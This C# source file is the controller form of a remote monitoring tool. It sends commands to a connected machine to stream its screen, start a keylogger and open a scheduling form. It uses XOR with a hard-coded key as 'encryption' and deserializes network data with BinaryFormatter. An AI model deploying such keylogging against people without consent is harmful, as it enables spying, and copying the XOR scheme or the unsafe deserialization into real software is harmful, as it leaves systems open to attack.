using System;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
namespace Server
{
    public partial class ControlForm : Form
    {
        private TcpClient client;
        private TcpClient screenClient;
        private TcpClient logClient;
        string clientID;
        private NetworkStream mainStream;
        private NetworkStream screenStream;
        private static ManualResetEvent mre = new ManualResetEvent(false);
        private Thread GetImage;

        const string KEY = "CHUONG TRINH THEO DOI TU XA";
        bool stopsharing = false;
        public byte[] Xor(string a, string b)
        {
            char[] charAArray = a.ToCharArray();
            char[] charBArray = b.ToCharArray();

            byte[] result = new byte[KEY.Length];
            for (int i = 0; i < KEY.Length; i++)
            {
                result[i] = (byte)(charAArray[i] ^ charBArray[i]);
            }
            return result;
        }
        public static byte[] Combine(byte[] first, byte[] second)
        {
            return first.Concat(second).ToArray();
        }
        public ControlForm(
                           TcpClient sclient,
                           TcpClient slogClient,
                           TcpClient sscreenClient,
                           string ID
                          )
        {
            client = sclient;
            clientID = ID;
            logClient = slogClient;
            screenClient = sscreenClient;
            Random random = new Random();
            var randomPassword = "";
            GetImage = new Thread(ReceiveImage);
            GetImage.IsBackground = true;
            for (var i = 0; i < KEY.Length; i++)
            {
                randomPassword += ((char)(random.Next(65, 90))).ToString();

            }
            /***********************************************************/
            try
            {
                string clientname = clientID.Replace(':', '_');
                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\[Password_[" + clientname + "]" + ".txt";
                FileStream fs = new FileStream(filePath, FileMode.Create);
                StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
                sr.Write(randomPassword);
                sr.Close();
                fs.Close();
            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
                Application.Exit();
            }
            /************************************************************/
            byte[] encryptPassword = Xor(randomPassword, KEY);
            mainStream = client.GetStream();
            Byte[] sendsecret = Combine(
                                    Combine(Encoding.ASCII.GetBytes("secret:"), 
                                            encryptPassword), 
                                    Encoding.ASCII.GetBytes("$"));
            mainStream.Write(sendsecret, 0, sendsecret.Length);
            InitializeComponent();
        }
        private void StopSharing()
        {
            stopsharing = true;
        }
        private void ReceiveImage()
        {
            try
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                while (client.Connected && Thread.CurrentThread.IsAlive)
                {
                    if (stopsharing)
                    {
                        ScreenCapture.Image = null;
                        mre.WaitOne();

                    }
                    screenStream = screenClient.GetStream();
                    ScreenCapture.Image = (Image)binaryFormatter.Deserialize(screenStream);

                }
            }
            catch{ 
                MessageBox.Show("Client disconnected");
                Application.Exit();
            }
        }
        private void btnShareScreen_Click(object sender, EventArgs e)
        {
            try
            {
                if (btnShareScreen.Text == "Share screen")
                {
                    mainStream = client.GetStream();
                    Byte[] ShareScreenComand = Encoding.ASCII.GetBytes("Share Screen$");
                    mainStream.Write(ShareScreenComand, 0, ShareScreenComand.Length);
                    stopsharing = false;
                    if (!GetImage.IsAlive)
                    {
                        GetImage.Start();
                    }
                    else
                        mre.Set();
                    btnShareScreen.Text = "Stop sharing";
                }

                else if (btnShareScreen.Text == "Stop sharing")
                {
                    StopSharing();
                    mainStream = client.GetStream();
                    Byte[] StopShareScreenComand = Encoding.ASCII.GetBytes("Stop Share Screen$");
                    mainStream.Write(StopShareScreenComand, 0, StopShareScreenComand.Length);

                    btnShareScreen.Text = "Share screen";
                }
            }
            catch
            {
                Application.Exit();
            }
        }
        private void ControlForm_Load(object sender, EventArgs e)
        {
        }
        private void btnHenGio_Click(object sender, EventArgs e)
        {
            try
            {
                mainStream = client.GetStream();
                Form HenGio = new HenGio(mainStream, clientID);
                HenGio.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Application.Exit();
            }
        }
        private void btnLogger_Click(object sender, EventArgs e)
        {
            try
            {
                mainStream = client.GetStream();

                Byte[] LogComand = Encoding.ASCII.GetBytes("log$");
                mainStream.Write(LogComand, 0, LogComand.Length);

                Form Keylog = new Keylogger(logClient, clientID);
                Keylog.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Application.Exit();
            }
        }
    }
}